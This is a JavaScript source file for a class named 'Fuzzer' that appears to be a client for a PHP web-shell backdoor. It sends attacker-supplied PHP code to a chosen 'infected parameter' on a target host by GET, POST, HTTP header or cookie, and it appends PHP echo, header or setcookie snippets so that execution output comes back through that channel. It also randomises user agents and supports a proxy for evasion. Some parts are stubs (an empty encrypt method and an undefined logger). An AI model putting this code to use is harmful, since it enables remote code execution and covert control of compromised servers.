let ApiCaller = require('request');
let UserAgent = require('random-useragent');

/*
 * @param {object} config = configuration of Fuzzer
 *
 * @config_param string Host = target URL
 * @config_param int Method = Http method for request [0: GET, 1: POST, 2: HEADER, 3: COOKIE]
 * @config_param string Parameter = Infected parameters
 * @config_param int Crypt = Is it a crypted request
 * 
 * {object} callbacks = Default callbacks methods
 * string httpMethod = Http method for request 
 * {object} request = current request
 */
class Fuzzer {
	constructor(config) {
		this._host = config.host;
		this._method = parseInt(config.method);
		this._parameter = config.parameter || "Dec";
		this._crypt = config.crypt;
		this._callbacks = {
			onSuccess: this.handleSuccess,
			onError: this.handleError
		};

		let httpMethod = this.getHttpMethod();
		this._config = {
			url: this.host,
			method: httpMethod,
			headers: {},
			form: {},
			jar: {},
			proxy: config.proxy || null
		};
	}

	/**
	 * Get php string to get response
	 */
	getHandleback() {
		let response;

		switch(this._method) {
			case 0:
			case 1:
				response = "exit(echo($r));";
				break;
			case 2: 
				response = "header('" + this._parameter + ":' . $r);";
				break;
			case 3:
				response = "setcookie('" + this._parameter + "', $r);";
				break;
		}

		return response;
	}

	/**
	 * Get Right HTTP Method
	 */
	getHttpMethod() {
		if(this._method == 1) {
			return "POST"
		}

		return "GET";
	}

	encrypt() {
		
	}

	/**
	 * Prepare request configuration
	 */
	prepare(request) {
		let config = this._config;

		config.headers["User-Agent"] = UserAgent.getRandom();
		request = request + this.getHandleback();

		switch(this._method) {
			case 0: //GET
				config.url = this._host + "?" + this._parameter + "=" + encodeURIComponent(request);
				break;
			case 1: //POST
				config.form[this._parameter] = request;
				break;
			case 2: //Header
				config.headers[this._parameter] = request;
				break;
			case 3: //Cookie
				let j = ApiCaller.jar(); 
				let cookie = ApiCaller.cookie(this._parameter + '=' + encodeURIComponent(request));
				j.setCookie(cookie, this._host);
			
				config.jar = j;
				break;
		}

		return config;
	}

	/**
	 * Send request
	 */
	send(request, onSuccess, onError) {
		var self = this;

		if(typeof request === 'object') {
			this._config = request;
		} else if(typeof request === 'string') {
			this._config = this.prepare(request);
		} else {
			logger.error("ERROR - Request is not valid!");
			throw new Error("Request is not valid!");
		}

		logger.log("info", "FINISH - Building config: \n %j \n", this._config, {});

		if(typeof onSuccess == "function") {
			this._callbacks.onSuccess = onSuccess;
		}

		if(typeof onError == "function") {
			this._callbacks.onError = onError;
		}

		ApiCaller(this._config, function(error, response, body) {
			if(!error && response.statusCode == 200) {
				logger.log("info", "INFO - Response: \n %s \n ", response);
				logger.log("info", "INFO - Body: \n %s \n ", body);

				if(self._config.jar instanceof ApiCaller.jar) {
					logger.log("info", "INFO - Cookies: \n %s \n ", self._config.jar.getCookies(self._host));
				}

				return self._callbacks.onSuccess(response, body, self);
			}

			logger.log("error", "ERROR - Error: \n %j \n", error);
			return self._callbacks.onError(error, response, body, self);
		});
	}

	handleSuccess(response, body, ref) {

	}

	handleError(error, response, body, ref) {

	}
}

module.exports = Fuzzer;
